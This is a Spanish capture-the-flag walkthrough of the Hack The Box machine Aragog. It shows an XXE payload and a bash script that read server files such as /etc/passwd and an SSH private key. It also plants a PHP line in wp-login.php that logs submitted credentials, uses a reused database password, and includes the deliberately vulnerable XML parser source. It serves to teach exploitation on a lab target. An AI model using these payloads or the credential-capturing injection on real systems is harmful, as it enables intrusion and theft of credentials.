10.10.10.78 - Aragog

![Aragog](https://user-images.githubusercontent.com/96772264/202145480-9702eaac-406b-4a76-a143-176ff3f6b875.png)

--------------------

# Part 1: Enumeración

Puertos abiertos 22(ssh), 21(ftp), 80(http). Nmap nos dice que:
- Puerto 21 (ftp) -> se puede con anonymous, version vsftpd 3.0.3
- Puerto 80 -> Apache httpd 2.4.18, Nombre aragog.htb

```console
└─$ ftp 10.10.10.78
Name (10.10.10.78:cucuxii): anonymous
230 Login successful.
ftp> prompt off
ftp> dir
-r--r--r--    1 ftp      ftp            86 Dec 21  2017 test.txt
ftp> mget *
ftp> exit
└─$ cat test.txt 
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```

```console
└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://aragog.htb/FUZZ/
000000070:   403        9 L      28 W       275 Ch      "icons"
000095511:   403        9 L      28 W       275 Ch      "server-status"
└─$ wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://aragog.htb/FUZZ.php
000006008:   200        3 L      6 W        46 Ch       "hosts"
```
-------------------------------

# Part 2: XXE
La página original es sitio por defecto de apache:
![aragog1](https://user-images.githubusercontent.com/96772264/202145591-d5e35542-8173-4bf1-8371-28d15c27570a.PNG)

La ruta /hosts.php nos dice que hay tales posibles hosts para una red (no nos dice cual).
![aragog2](https://user-images.githubusercontent.com/96772264/202145656-415fb445-c649-4c47-9a36-51db24520c7c.PNG)

Si probamos a darle el archivo que nos descargamos:
```console
└─$ curl -s -X POST http://aragog.htb/hosts.php -d @test.txt
There are 62 possible hosts for 255.255.255.192
```
Nos hace un subneteo.
Cambiamos la ip del test.test por otra al azar:
```console
└─$ curl -s -X POST http://aragog.htb/hosts.php -d @test.txt
There are 1902772222 possible hosts for 142.150.0.0
```
Como lo que estamos enviando es un XML, se podría intentar un XXE básico:
```console
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
└─$ curl -s -X POST http://aragog.htb/hosts.php -d @test.txt 
There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```
-------------------------------

# Part 3: LFI

Tenemos por tanto lectura de archivos, me hice un script para automatizar esto:
```bash
#!/bin/bash

file=$1
rm -rf $(pwd)/test.txt
cat << EOF > $(pwd)/test.txt
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://$file"> ]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>
EOF
curl -s -X POST http://aragog.htb/hosts.php -d @test.txt | sed 's/There are .* possible hosts for//g'
```
Dicho script crea un archivo xml cada vez por el archivo que queramos leer, ademas destruye el anterior.

```console
└─$ ./files.sh /etc/passwd | grep "sh$" 
# root, florian y cliff
└─$ for port in $(./files.sh /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | tr "\n" ","; done
22,3306,52600 # Puertos internos (ssh, mysql y otro que no se que es)
└─$ ./files.sh /proc/net/fib_trie | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u  | tr "\n" " "
10.10.10.78 127.0.0.1 
# Interfaces abiertas, no parece haber contenedores
└─$ ./files.sh /proc/self/environ # nada
└─$ ./files.sh /home/florian/.ssh/id_rsa
 -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d
...
```
Copiamos la id_rsa que acabamos de conseguir. (Quitarle el espacio del principio)

```console
└─$ chmod 600 id_rsa
└─$ ssh -i id_rsa florian@10.10.10.78
florian@aragog:~$ 
```
-------------------------------

# Part 4: Explotación de wordpress

Ya tenemos la user.txt con él, para escalar privilegios tiramos de nuestro script de reconocimiento, pero como con él no encuentro nada, tiraré del de [monitoreo](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh).
```console
florian@aragog:/tmp$ ./procmon.sh
> /usr/sbin/CRON -f
> /bin/sh -c /usr/bin/python3 /home/cliff/wp-login.py
> /usr/bin/python3 /home/cliff/wp-login.py
> /bin/bash /root/restore.sh

florian@aragog:/tmp$ cat /home/cliff/wp-login.py
cat: /home/cliff/wp-login.py: Permission denied
```
Parece que se están autenticando automaticamente con el script /home/cliff/wp-login.py, aunque no podamos leerlo.
Como nos hablan de wp-login (archivo de wordpress) seguro que existe un wp-config (archivo con creds de la base de datos)
```console
florian@aragog:/tmp$ find / -name "wp-config.php" 2>/dev/null
/var/www/html/zz_backup/wp-config.php # Este nos da permiso denegado
/var/www/html/dev_wiki/wp-config.php  # Este otro si que nos deja leerlo

florian@aragog:/tmp$ cat /var/www/html/dev_wiki/wp-config.php | grep "^define"
define('DB_USER', 'root');
define('DB_NAME', 'wp_wiki');
define('DB_PASSWORD', '$@y6CHJ^$#5c37j$#6h');
define('DB_HOST', 'localhost');

florian@aragog:/tmp$ mysql -u 'root' -p                                                                           
Enter password: $@y6CHJ^$#5c37j$#6h
mysql> show databases; # interesante -> wp_wiki
mysql> use wp_wiki;
mysql> show tables; # -> wp_users
mysql> show columns from wp_users;
mysql> select user_login, user_pass, user_email from wp_users;
Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | it@megacorp.com
```

Sería la clave un rabbit hole porque no se pudo romper con el jhon.
En la ruta /var/www/html se guarda el codigo fuente de la web que se está ofreciendo por el servidor
```console
florian@aragog:/var/www/html$ ls
dev_wiki  hosts.php  index.html  zz_backup
```
Como vemos hay una ruta nueva llamada dev_wiki (es un directorio con cosas de wordpress). O sea hay otra página de wordpress **aragog.htb/dev_wiki**

![aragog3](https://user-images.githubusercontent.com/96772264/202146138-9e7b6e30-bb3c-4af5-996e-553f10828540.PNG)

Si se están tratando de autenticar con el script de python de cliff /home/cliff/wp-login.py, podriamos pillar esa autenticción modificando el archivo 
 **./wp-login.php**, poninedo al principio:
```php
<?php
file_put_contents("/var/www/html/creds.txt" ,$_REQUEST, FILE_APPEND);
```
Hacemos un ```watch -n 1 curl -s http://aragog.htb/creds.txt``` y obtenemos las creds: *Administrator:!KRgYs(JFO!&MTr)lf*
```console
min/1florian@aragog:/var/www/html/dev_wiki$ su 
Password: 
root@aragog:~# cat root.txt
```

-------------------------------

# Extra: Script en php hosts.php, subneteo.

¿Que es el subneteo? [Aquí lo explico](https://github.com/CUCUxii/Investigacion/blob/main/Como-funciona/Teoria-redes.md)

```php
<?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $details = simplexml_import_dom($dom);
    $mask = $details->subnet_mask;
    //echo "\r\nYou have provided subnet $mask\r\n";

    $max_bits = '32';
    $cidr = mask2cidr($mask);
    $bits = $max_bits - $cidr;
    $hosts = pow(2,$bits);
    echo "\r\nThere are " . ($hosts - 2) . " possible hosts for $mask\r\n\r\n";

    function mask2cidr($mask){
         $long = ip2long($mask);
         $base = ip2long('255.255.255.255');
         return 32-log(($long ^ $base)+1,2);
    }
?>
```
